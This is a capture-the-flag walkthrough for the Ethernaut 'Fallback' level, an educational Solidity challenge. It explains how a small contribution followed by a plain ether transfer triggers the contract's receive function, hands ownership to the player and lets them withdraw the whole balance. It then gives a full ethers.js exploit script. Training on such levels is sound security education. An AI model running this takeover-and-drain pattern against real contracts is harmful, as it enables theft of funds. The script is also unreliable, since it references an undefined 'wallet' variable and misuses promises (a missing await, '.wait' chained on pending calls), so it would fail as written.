---
description: >-
  In Ethernaut's Fallback, we get some practice walking through Solidity
  contract logic and are introduced to the concept of "fallback" functions.
---

# 1 - Fallback

The goal of [this level](https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6Cb55dE6ca23164130D008) is to claim ownership of the `Fallback` contract and reduce its balance to zero.

### Hints

<details>

<summary>Hint One</summary>

Before we can withdraw funds, we must first become the contract's `owner`. Where in the code is the owner variable first assigned? Where is it reassigned? When it is reassigned, what conditions need to be met that would result in `msg.sender` becoming the `owner`? Could we construct a series of transactions to meet these conditions?

</details>

<details>

<summary>Hint Two</summary>

We can become the contract `owner` by triggering its `receive` function after making an initial transaction via the `contribute` function to satisfy the second part of its `require(msg.value > 0 && contributions[msg.sender] > 0);` condition. The `receive` function is a special "fallback" function in Solidity. How is it triggered?

</details>

### Full Walkthrough

#### Claiming Ownership

The contract's `owner` is set by its constructor to the address from which it was deployed. There are only two sections of the code in which the owner may be reassigned. The first, within the `contribute` function, is a dead end. This is because it requires the sender's contributions to be greater than the owner's, while the constructor has already set the owner's contribution to 1,000 ether (line 13: `contributions[msg.sender] = 1000 * (1 ether);`) and the `contribute` function limits each of the player's contributions to < 0.001 ether.

```solidity
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if (contributions[msg.sender] > contributions[owner]) {
        owner = msg.sender;
    }
}
```

The second section of the code in which the contract owner may be reassigned is found within the `receive` ("Receive Ether") function.

```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

The `receive` function checks first that the value of the transaction is non-zero, and that the contributions of the sender address are non-zero, before reassigning the `owner` to `msg.sender`. This means we may pass this `require` condition by first sending a small transaction via the `contribute` function (< 0.001 ether), then by sending a second transaction of any non-zero value to the contract address with empty calldata to trigger its `receive` function.

{% hint style="info" %}
**Fallback Functions**

Solidity (version 0.6.x+) contracts may contain two special "fallback" functions, `receive` and `fallback`:

* **receive** is triggered when a contract receives a transaction with empty calldata.
* **fallback** is triggered when no other function (not even `receive`) matches.
{% endhint %}

#### Reducing Balance to Zero

Once the owner address is set to the player's address, we may call the `withdraw` function directly as the `require` condition of the `onlyOwner` modifier has now been satisfied.

```solidity
function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
}
```

### Scripted Solution

```javascript
const ethers = require('ethers')
const fs = require('fs')
require('dotenv').config({ path: './.env' })

/**
 * Initialize Ethers objects needed to interact with the blockchain and 
 * contract.
 */
async function setup(contractName) {
  // Create provider - a read-only abstraction to access blockchain data
  const provider = new ethers.providers.InfuraProvider(process.env.NETWORK)
  // Create player wallet
  const playerWallet = new ethers.Wallet(process.env.PRIVATE_KEY)
  // Create player wallet signer - an abstraction of an Ethereum account
  const playerWalletSigner = await wallet.connect(provider)
  // Create contract instance - an abstraction of the deployed contract code
  const contractAbi = fs.readFileSync(`./${contractName}.abi`, 'utf8')
  const contract = new ethers.Contract(
    process.env.CONTRACT_ADDRESS,
    contractAbi,
    playerWalletSigner
  )

  return { provider, playerWallet, playerWalletSigner, contract }
}

/**
 * Run contract exploit.
 */
async function main() {
  // Get Ethers objects needed to interact with the blockchain and contract
  const {
    provider,
    playerWallet,
    playerWalletSigner,
    contract: fallbackContract,
  } = setup('Fallback')

  // Contribute 0.0001 ether via Fallback contract's 'contribute' function
  const contributionValue = ethers.utils.parseEther('0.0001')
  console.log(
    `Sending Fallback 'contribute' ${contributionValue.toString()}...`
  )
  await fallbackContract
    .contribute({
      value: contributionValue,
    })
    .wait(1)

  // Confirm contribution via Fallback contract's 'getContribution' function
  console.log(
    `Current contribution: ${await fallbackContract
      .getContribution()
      .toString()}`
  )

  // Send ether to Fallback contract address ('receive' function)
  console.log(
    `Sending ${contributionValue.toString()} to Fallback contract address...`
  )
  await playerWalletSigner
    .sendTransaction({
      to: process.env.CONTRACT_ADDRESS,
      value: contributionValue,
      gasPrice: 20000000000,
    })
    .wait(1)

  // Check current Fallback contract 'owner'
  const fallbackContractOwner = await fallbackContract.owner()
  console.log(`Fallback contract 'owner' is now: ${fallbackContractOwner}`)

  if (fallbackContractOwner === playerWallet.address) {
    console.log('Player is contract owner.')

    // Withdraw funds via Fallback contract's 'withdraw' function
    console.log('Withdrawing contract balance...')
    await fallbackContract.withdraw().wait(1)

    // Check new Fallback contract balance
    const contractBalance = await provider.getBalance(
      process.env.CONTRACT_ADDRESS
    )
    console.log(`Contract balance is now: ${contractBalance.toString()}`)
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
```

### Key Takeaways

* Solidity contains two special **fallback functions**. One of which, **receive**, is triggered when a contract receives a transaction with empty calldata.
